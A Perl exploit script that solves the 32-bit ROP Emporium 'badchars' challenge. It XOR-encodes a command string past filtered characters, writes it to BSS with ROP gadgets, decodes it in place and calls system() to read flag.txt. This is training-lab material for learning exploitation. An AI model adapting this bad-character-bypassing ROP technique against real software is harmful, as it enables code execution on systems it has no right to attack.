# This is similar to plan B for the 64 bits version. Plan A seems not possible
# in 32bits: it appears that the call to system() will fail for a ROP chain
# longer than 236 bytes (plan A generates a 260 bytes chain in this case).
#
# The beginners guide warned us about this issue:
#   " Random
#   In some cases your exploit may not succeed for no apparent reason. Remember
#   that you're corrupting data and sometimes these binaries will exhibit
#   undefined behaviour. For example in the badchars challenge, a chain of
#   particular length may cause your exploit to fail on the 32 bit binary for no
#   apparent reason. (It’s still unclear as to why...)"
#
# Fortunately, plan B generates a smaller chain of 232 bytes.

use strict;
use warnings;

my %BADCHARS = (
	' ' => 1,
	'/' => 1,
	'b' => 1,
	'c' => 1,
	'f' => 1,
	'i' => 1,
	'n' => 1,
	's' => 1,
);


my $PADDING  = "B"x44;
my $BSS      = "\x40\xa0\x04\x08"; # BSS section
my $CALLSYS  = "\xb7\x87\x04\x08"; # call to system()

my $ALLIGN  = 4;
my $XORBYTE = 0xBB;

sub xor_memory
{
	my ($addr, $string) = @_;

	my $cl_is_set = 0;

	my $rop = "";
	for my $char (split //, $string)
	{
		if ($BADCHARS{$char})
		{
			# The first xor must set both ebx and ecx
			if (not $cl_is_set)
			{
				$cl_is_set = 1;
				$rop .= "\x96\x88\x04\x08"; # pop ebx; pop ecx
				$rop .= pack("VV", $addr, $XORBYTE);
			}

			# The remaining XORs can only set ebx and reuse the previous
			# value for cl, thus keeping the ROP chain short.
			else
			{
				$rop .= "\x16\x89\x04\x08"; # pop ebx
				$rop .= pack("V", $addr);
			}

			$rop .= "\x90\x88\x04\x08"; # xor byte [ebx], cl
		}

		$addr++;
	}

	$rop;
}

sub xor_badchars
{
	my ($string) = @_;
	join(
		"",
		map { $BADCHARS{$_} ? chr(ord($_) ^ $XORBYTE) : $_ }
			(split //, $string)
	);
}

sub write_bytes
{
	my ($addr, $string) = @_;

	my $mod = (length $string) % $ALLIGN;
	if ($mod ne 0) {
		$string .= "\x00" x ($ALLIGN - $mod);
	}

	my $rop = "";
	for my $str (unpack("(a$ALLIGN)*", $string))
	{
		$rop .= "\x99\x88\x04\x08"; # pop esi; pop edi
		$rop .= $str;
		$rop .= pack("V", $addr);
		$rop .= "\x93\x88\x04\x08"; # mov qword [edi], esi
		$addr += $ALLIGN;
	}

	$rop;
}


my $str = "/bin/cat flag.txt\0";

print $PADDING
	. write_bytes(0x0804a040, xor_badchars($str)) # write @bss
	. xor_memory(0x0804a040, $str)
	. $CALLSYS
	. $BSS
;
